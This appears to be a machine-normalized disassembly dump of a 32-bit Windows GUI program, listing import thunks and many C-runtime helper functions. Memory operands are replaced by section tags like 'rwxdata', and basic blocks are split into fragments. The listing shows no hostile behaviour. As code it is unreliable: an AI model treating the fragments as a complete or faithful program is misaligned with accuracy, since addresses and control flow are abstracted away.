GetModuleFileNameA
jmp [ GetModuleFileNameA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
DialogBoxParamA
jmp [ DialogBoxParamA@IAT ]
LoadCursorA
jmp [ LoadCursorA@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
LoadAcceleratorsA
jmp [ LoadAcceleratorsA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
EndDialog
jmp [ EndDialog@IAT ]
TranslateAcceleratorA
jmp [ TranslateAcceleratorA@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RegisterClassExA
jmp [ RegisterClassExA@IAT ]
GetMessageA
jmp [ GetMessageA@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
sub_405927
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407983
add esp 0x10
pop ebp
retn
sub_405a00
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_407a7d
pop ecx
pop ecx
pop ebp
retn
sub_405a15
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_407ab6
pop ecx
pop ecx
pop ebp
retn
sub_405a2a
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407a99
add esp 0xc
pop ebp
retn
sub_405a43
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407ad2
add esp 0xc
pop ebp
retn
sub_405adc
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_405aac
sub_405b99
push [ ebp + 0x8 ]
call sub_407f49
pop ecx
retn
sub_405ba3
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405ae7
add esp 0xc
pop ebp
retn
sub_405dc8
push [ ebp + 0x14 ]
call sub_407f49
pop ecx
retn
sub_405fc1
push [ ebp + 0x8 ]
call sub_407f49
pop ecx
retn
sub_4060c7
push [ ebp + 0x8 ]
call sub_407f49
pop ecx
retn
sub_4061aa
push esi
call sub_407f49
pop ecx
retn
sub_40629e
push esi
call sub_407f49
pop ecx
retn
sub_406392
push esi
call sub_407f49
pop ecx
retn
sub_4063e0
mov [ ecx ] r--data
jmp sub_409bf4
sub_406412
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_409ca0
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40664e
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_40a762
pop ecx
pop ecx
retn
sub_406662
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_40a4e0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_4083c5
retn
push eax
call sub_40a4bb
_start
call sub_40b2b1
jmp sub_40651f
sub_406987
cmp [ ecx + 0xc ] 0x0
je r-xdata
retn
mov eax [ ecx + 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_406995
mov eax ecx
retn
sub_406a65
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_406a77
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
pop ebp
retn
sub_406a8c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
pop ebp
retn
sub_40764b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_4077aa
push [ rwxdata ]
call [ DecodePointer@IAT ]
retn
sub_4077dc
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4077b7
int3
sub_407861
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4077f6
sub_407a07
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407983
add esp 0x10
pop ebp
retn
sub_407a7d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_406a9f
call sub_407a21
add esp 0x10
pop ebp
retn
sub_407a99
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_406a9f
call sub_407a21
add esp 0x10
pop ebp
retn
sub_407ab6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_40cb17
call sub_407a21
add esp 0x10
pop ebp
retn
sub_407ad2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40cb17
call sub_407a21
add esp 0x10
pop ebp
retn
sub_407c83
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407c0c
add esp 0x14
pop ebp
retn
sub_407eb6
call sub_4090c6
cmp [ rwxdata ] 0x0
je r-xdata
push [ rwxdata ]
call sub_409812
pop ecx
retn
call sub_40eaa0
sub_408375
push 0x1
call sub_40ebdd
pop ecx
retn
sub_4083c5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_4083e0
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
jmp sub_405894
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_405894
sub_408676
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_4085a0
add esp 0xc
pop ebp
retn 0x4
sub_4086a9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_40fbe5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_4086db
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_4085a0
add esp 0xc
pop ebp
retn 0x8
sub_408ebb
push ebx
call sub_40fffa
pop ecx
retn
sub_40903b
mov eax [ rwxdata ]
push [ eax + esi * 4 ]
push esi
call sub_407f85
pop ecx
pop ecx
retn
sub_40906a
push 0x1
call sub_40ebdd
pop ecx
retn
sub_4090bc
push [ ebp + 0x8 ]
call sub_407f49
pop ecx
retn
sub_4090c6
push 0x1
call sub_408f99
pop ecx
retn
sub_40980a
push ebx
call sub_40fffa
pop ecx
retn
sub_4099a4
push ebx
call sub_40fffa
pop ecx
retn
sub_409aff
mov eax ecx
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
mov [ eax + 0x8 ] 0x0
retn
sub_409b10
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_409b2d
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_409b7a
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_409812
pop ecx
sub_409bf4
mov [ ecx ] r--data
jmp sub_409b7a
sub_409c1d
mov [ ecx ] r--data
jmp sub_409b7a
sub_409c46
mov [ ecx ] r--data
jmp sub_409b7a
sub_409c51
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_409c28
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409c6e
mov [ ecx ] r--data
jmp sub_409b7a
sub_409cec
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_409ca0
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409d30
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_409ca0
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409d74
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_409d30
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409d91
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push ecx
call sub_410c38
pop ecx
pop ecx
pop ebp
retn 0x4
sub_409da5
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_410bc8
pop ecx
retn
sub_409dd6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push ecx
call sub_410dcd
pop ecx
pop ecx
pop ebp
retn 0x4
sub_409dec
push ecx
call sub_410d2a
pop ecx
retn
sub_409e59
lea eax [ ecx + 0x8 ]
retn
sub_409e5d
mov eax ecx
mov [ eax ] r--data
retn 0x4
sub_409e68
mov eax ecx
retn 0x4
sub_409e6d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_409812
sub_409f95
call sub_40a1f1
retn
sub_409f9b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_409f5f
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_40a085
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_40a0cb
push 0x0
call sub_40a094
pop ecx
retn
sub_40a0d4
push [ rwxdata ]
call [ DecodePointer@IAT ]
retn
sub_40a197
push sub_40a155
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_40a1d0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40a1a5
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_40a1e8
push 0x8
call sub_40ecce
pop ecx
retn
sub_40a1f1
push 0x8
call sub_40ebdd
pop ecx
retn
sub_40a490
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_40ebdd
pop ecx
sub_40a4a5
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40a365
add esp 0xc
pop ebp
retn
sub_40a4bb
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_40a365
add esp 0xc
pop ebp
retn
sub_40a4d1
push 0x1
push 0x0
push 0x0
call sub_40a365
add esp 0xc
retn
sub_40a4e0
push 0x1
push 0x1
push 0x0
call sub_40a365
add esp 0xc
retn
sub_40a4ef
mov edi edi
push ebp
mov ebp esp
call sub_40a703
push [ ebp + 0x8 ]
call sub_40a554
pop ecx
push 0xff
call sub_40a4bb
int3
sub_40aa07
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_40ad4e
push 0x0
call [ EncodePointer@IAT ]
retn
sub_40ad57
call [ TlsAlloc@IAT ]
retn 0x4
sub_40ad60
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rwxdata ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_40ad7a
mov eax [ rwxdata ]
retn
sub_40adb4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rwxdata ]
call [ DecodePointer@IAT ]
call eax
pop ebp
retn 0x8
sub_40aeb0
push 0xd
call sub_40ebdd
pop ecx
retn
sub_40aeb9
push 0xc
call sub_40ebdd
pop ecx
retn
sub_40b06f
push 0xd
call sub_40ebdd
pop ecx
retn
sub_40b07b
push 0xc
call sub_40ebdd
pop ecx
retn
GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
GetCurrentThread
jmp [ GetCurrentThread@IAT ]
sub_40b279
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rwxdata ] eax
mov eax ecx
retn
sub_40b297
push [ rwxdata ]
call [ HeapDestroy@IAT ]
and [ rwxdata ] 0x0
retn
sub_40b2ab
mov eax [ rwxdata ]
retn
sub_40b34c
and [ rwxdata ] 0x0
retn
sub_40b4b9
push [ ebp + 0x8 ]
call sub_40fffa
pop ecx
retn
sub_40b820
push 0xd
call sub_40ebdd
pop ecx
retn
sub_40bc2d
push 0xd
call sub_40ebdd
pop ecx
retn
sub_40bc66
cmp [ rwxdata ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_40bacc
pop ecx
mov [ rwxdata ] 0x1
sub_40bfb1
push 0xc
call sub_40ebdd
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_40c006
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ rwxdata ]
mov [ rwxdata ] ecx
pop ebp
retn
sub_40c1e0
call sub_407dff
add eax 0x20
push eax
push 0x1
call sub_407f85
pop ecx
pop ecx
retn
sub_40c1f3
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413866
add esp 0xc
pop ebp
retn
sub_40c20c
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413883
add esp 0xc
pop ebp
retn
sub_40c225
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0x0
push [ ebp + 0x8 ]
call sub_413883
add esp 0xc
pop ebp
retn
sub_40c23d
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4138a0
add esp 0xc
pop ebp
retn
sub_40c256
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0x0
push [ ebp + 0x8 ]
call sub_4138a0
add esp 0xc
pop ebp
retn
sub_40c298
mov eax [ rwxdata ]
or eax 0x1
xor ecx ecx
cmp [ rwxdata ] eax
sete cl
mov eax ecx
retn
sub_40c568
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40c530
pop ecx
pop ecx
pop ebp
retn
sub_40c57b
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c591
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c5a7
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c5ba
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c5cd
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c5e0
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c5f3
mov edi edi
push ebp
mov ebp esp
push 0x4
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c606
mov edi edi
push ebp
mov ebp esp
push 0x4
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c619
mov edi edi
push ebp
mov ebp esp
push 0x80
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c62f
mov edi edi
push ebp
mov ebp esp
push 0x80
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c645
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c658
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c66b
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c67e
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c691
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c6a7
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c6bd
mov edi edi
push ebp
mov ebp esp
push 0x157
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c6d3
mov edi edi
push ebp
mov ebp esp
push 0x157
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c6e9
mov edi edi
push ebp
mov ebp esp
push 0x117
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c6ff
mov edi edi
push ebp
mov ebp esp
push 0x117
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c715
mov edi edi
push ebp
mov ebp esp
push 0x20
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c728
mov edi edi
push ebp
mov ebp esp
push 0x20
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_40c73b
mov edi edi
push ebp
mov ebp esp
mov eax 0x80
cmp [ ebp + 0x8 ] ax
sbb eax eax
neg eax
pop ebp
retn
sub_40cb02
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
pop ebp
retn
sub_40eb33
push 0x1
call sub_40ebdd
pop ecx
retn
sub_40ebdd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rwxdata ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40ebf4
push [ esp + 0x4 ]
push 0x0
call [ FatalAppExitA@IAT ]
push 0xff
call sub_40a1d0
sub_40ecc5
push 0xa
call sub_40ebdd
pop ecx
retn
sub_40f7fd
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f5f9
add esp 0x10
pop ebp
retn
sub_40f963
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f817
add esp 0x10
pop ebp
retn
sub_40fa9b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_40fbb9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40faf0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40fc04
call eax
retn
sub_40fc86
push 0x3
call sub_40ebdd
pop ecx
retn
sub_40fda5
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fc8f
add esp 0x10
pop ebp
retn
sub_40fff1
push 0xa
call sub_40ebdd
pop ecx
retn
sub_4100f3
push 0xa
call sub_40ebdd
pop ecx
retn
sub_4101b1
push 0xb
call sub_40ebdd
pop ecx
retn
sub_4103a1
push ebx
call sub_40fffa
pop ecx
retn
sub_4104ac
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rwxdata ] eax
xor eax eax
retn
sub_410b61
push ebx
call sub_40fffa
pop ecx
retn
sub_410c2f
push 0xe
call sub_40ebdd
pop ecx
retn
sub_410d21
push 0xe
call sub_40ebdd
pop ecx
retn
sub_410d91
push 0xe
call sub_40ebdd
pop ecx
retn
sub_410ed0
push 0xe
call sub_40ebdd
pop ecx
retn
sub_410f23
push 0xe
call sub_40ebdd
pop ecx
retn
sub_410feb
push 0x8
push r--data
call sub_408380
call sub_40af3b
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_41a21d
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_41100b
xor eax eax
inc eax
retn
sub_411037
push 0x8
push r--data
call sub_408380
push [ rwxdata ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
call sub_410feb
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_41105b
xor eax eax
inc eax
retn
sub_41105f
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410feb
sub_41106f
push sub_410feb
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
retn
sub_411080
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
mov [ rwxdata ] eax
mov [ rwxdata ] eax
mov [ rwxdata ] eax
pop ebp
retn
sub_41111a
push edi
call sub_40ebdd
pop ecx
retn
sub_411171
push [ rwxdata ]
call [ DecodePointer@IAT ]
retn
sub_41117e
call sub_40af3b
add eax 0x64
retn
sub_411187
call sub_40af3b
add eax 0x60
retn
sub_411395
push 0x0
call sub_40ebdd
pop ecx
retn
sub_411537
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_40ebdd
pop ecx
sub_411573
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_41181e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_411b98
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_411bfa
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411c13
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411c2b
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411c44
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411c5c
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411c75
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411c8d
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411ca9
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push 0x0
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411cc4
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411ce0
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push 0x0
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411cfb
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411d17
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push 0x0
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411d32
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411d4e
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push 0x0
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411d69
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411d82
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push 0x0
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411d9a
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411db3
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411dcb
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411de4
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_411ba7
add esp 0x10
pop ebp
retn
sub_411e51
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_411dfc
pop ecx
pop ecx
pop ebp
retn
sub_411e64
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
add eax 0x8
sub_413516
call sub_40af3b
mov ecx [ eax + 0x6c ]
cmp ecx [ rwxdata ]
je r-xdata
mov eax [ rwxdata ]
retn
mov ecx [ rwxdata ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_40bf44
sub_41353c
mov eax [ rwxdata ]
retn
sub_413542
call sub_40af3b
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_40bf44
sub_41356b
push 0x2
call sub_40a4ef
sub_41385e
push esi
call sub_407f49
pop ecx
retn
sub_413866
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_406a9f
call sub_4137e1
add esp 0x10
pop ebp
retn
sub_413883
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40ded0
call sub_4137e1
add esp 0x10
pop ebp
retn
sub_4138a0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40cb17
call sub_4137e1
add esp 0x10
pop ebp
retn
sub_4138bd
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_406a9f
call sub_4137e1
add esp 0x10
pop ebp
retn
sub_4138d9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_40ded0
call sub_4137e1
add esp 0x10
pop ebp
retn
sub_4138f5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_40cb17
call sub_4137e1
add esp 0x10
pop ebp
retn
sub_413cb8
call sub_40af3b
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ eax + 0xac ]
retn
